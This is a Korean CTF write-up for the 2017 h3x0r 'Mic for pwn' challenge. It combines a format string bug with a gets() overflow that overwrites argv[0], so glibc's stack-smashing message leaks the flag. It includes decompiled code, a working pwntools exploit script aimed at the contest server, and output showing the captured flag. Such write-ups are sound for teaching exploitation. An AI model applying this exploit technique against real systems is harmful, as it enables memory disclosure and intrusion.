# 2017 h3x0r - [PWN] Mic for pwn

## Key words

- i386 | NX | SSP
- Format String Bug (FSB)
- Leak memory by SSP

## Solution

문제를 보면 몇 가지 의심 상황이 보입니다.

먼저 버그가 발생되는 지점은 다음과 같습니다.

```c
  fn_vul_80487F1((int)"Give me your name!\n");
  fgets(g_buf_0804a085, 13, stdin);
  fn_vul_80487F1((int)"If you want start, press enter\n");
  do
    v2 = getchar();
  while ( v2 != 10 && v2 != -1 );
  fn_vul_80487F1((int)"Your name is ");
  printf(g_buf_0804a085); # Format String Bug
```

일반적인 FSB 버그인데, 한 가지 제약사항은 단 한번만 가능하고 13바이트만 스트링으로 입력 할 수 있다는 점 입니다.

다음으로 프로그램 로직을 살펴 보면 처음에 `0x0804a050` 위치에 소지하고 있는 돈이 존재 하고, 사용자의 입력을 받아 1~10000 까지의 숫자를 맞추는 형식 입니다.

만약 소지하고 있는 금액이 99999를 넘게 되면 다음 로직으로 들어가게 됩니다.

```c
int fn_congratz_804885D()
{
  char s; // [sp+18h] [bp-20h]@1
  int v2; // [sp+2Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  fn_vul_80487F1((int)"For the save record,Give me the Comment!\n");
  fn_vul_80487F1((int)"Comment : \n");
  gets(&s);
  fn_vul_80487F1((int)"Save Successfully!\n");
  return *MK_FP(__GS__, 20) ^ v2;
}
```

`ebp-0x20` 변수에서 `gets`에 의해 버퍼 오버플로우가 발생하게 됩니다. 하지만 `SSP`가 걸려 있어 스택 버퍼 오버플로우를 시킬 수 없습니다.

마지막으로 프로그램 시작 시, 굉장히 의심스러운 루틴으로 먼저 접근하게 됩니다.

```c
int sub_804870D()
{
  int v0; // ST4C_4@1
  FILE *v1; // ST14_4@1

  v0 = *MK_FP(__GS__, 20);
  v1 = fopen("flag", "r");
  __isoc99_fscanf(v1, "%s", &unk_804A0A0);
  setenv("LIBC_FATAL_STDERR_", "1", 0);
  return *MK_FP(__GS__, 20) ^ v0;
}
```

이 루틴은 처음에 시작하는데 `xref`를 찾아봐도 없길래 동적 디버깅해서 따라가본 결과 `Main`이 실행되기 전에 다음과 같이 동적 호출에 의해 플래그를 `0x0804a0a0`에 넣는 루틴을 타게 됩니다.

```
.text:080486F2                 push    ebp
.text:080486F3                 mov     ebp, esp
.text:080486F5                 sub     esp, 18h
.text:080486F8                 mov     [esp+1Ch+var_1C], offset dword_8049F10
.text:080486FF                 call    eax
```

총합 해보면 다음과 같습니다.
- 프로그램 시작 시 `0x0804a0a0` 위치에 플래그를 저장
- 프로그램에는 한 번의 13바이트 FSB 기회가 존재
- `0x0804a050`의 값이 99999를 넘게 되면 버퍼 오버플로우 버그가 존재하는 함수를 호출

결론적으로, SSP의 Stack Smashing 에러 메시지를 이용하여 `0x0804a0a0`를 출력하면 됩니다.

SSP에 의해 메모리 노출되는 시나리오에 대한 내용은 해당 루틴을 조금만 따라 가보면 다음과 같음을 알 수 있습니다.

먼저, 스택 버퍼 오버플로우에 의해 스택 카나리가 깨지고 결국 `call <__stack_chk_fail@plt>` 을 하게 됩니다.

`__stack_chk_fail`은 GNU C Library에서 찾을 수 있으며 위치는 `debug/stack_chk_fail.c`에 구현이 존재합니다.

```c
#include <stdio.h>
#include <stdlib.h>

extern char **__libc_argv attribute_hidden;

void
__attribute__ ((noreturn))
__stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
```

`__fortify_fail`을 조금 더 따라 가보면 다음과 같습니다.

```c
#include <stdio.h>
#include <stdlib.h>

extern char **__libc_argv attribute_hidden;

void
__attribute__ ((noreturn))
__fortify_fail (msg)
     const char *msg;
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
libc_hidden_def (__fortify_fail)
```

우리가 일반적으로 SSP를 위반했을 때 발생되는 메시지가 보이네요. 중요한점은 terminate의 메시지가 argv[0]을 쓴다는 점 입니다.

이를 이용하여 한 번의 메모리 노출 기회로 우리가 원하는 행위를 할 수 있는 경우, SSP 로직의 이 부분을 이용하여 공격을 할 수가 있습니다.

이 문제는 위의 조건에 만족하기 때문에 다음과 같은 시나리오를 생각해봅니다.

- FSB를 이용하여 사용자 소지금을 99999이상 설정
- `congratz` 함수에서 버퍼 오버플로우를 이용하여 스택을 메인 방향으로 계속 `0x0804a0a0`를 덮어 씀
- 메인의 인자 argv[0] 까지 정상적으로 덮히게 되면 `congratz`함수가 끝날 때 스택 카나리를 확인하게 되고 위의 abort 메시지 출력 루틴을 타게 되면서 argv[0] = `0x0804a0a0`를 출력하게 됨

현재 스택에서 소지금의 위치가 얼마나 떨어져 있는지 찾기 위해 동적으로 디버깅하여 포멧 스트링의 위치와 소지금의 위치에 대한 오프셋을 계산하였고, 그 뒤에 `0x0804a0a0`를 스프레잉 하여 플래그를 얻었습니다.

## Exploit code
```python
from pwn import *
context(arch="i386", os="linux")

server = "52.25.103.221"
port = 9003

r = remote(server, port)
#r = process("./mic_for_pwn")

print r.recv()
payload = "%100000c%6$n"

r.send(payload + "\x0a")
for i in xrange(30): print r.recv()

addr_flag = 0x0804a0a0
payload = p32(addr_flag) * 0x100
r.send(payload + "\x0a")

print r.recv()
r.interactive()
```

## Result
```
hackability@ubuntu:~/ctf/pwnable/0011_2017_h3x0r_MicForPwn$ python sol_mic.py
[+] Opening connection to 52.25.103.221 on port 9003: Done
==========Welcome to my Game==========

| You have to guess a correct number |
| Rule is easy, get a 100 thousand!  |
| Now game is start, plz  enjoy it!  |
======================================
Give me your name!

If you want start, press enter

...<snip>...

Your money is 100000
Congratulation!
For the save record,Give me the Comment!
Comment :
Save Successfully!
*** stack smashing detected ***: H3X0R{s1mp1e_ssp_le4k_w1th_overwri77en_ct0r} terminated
[*] Got EOF while reading in interactive
```
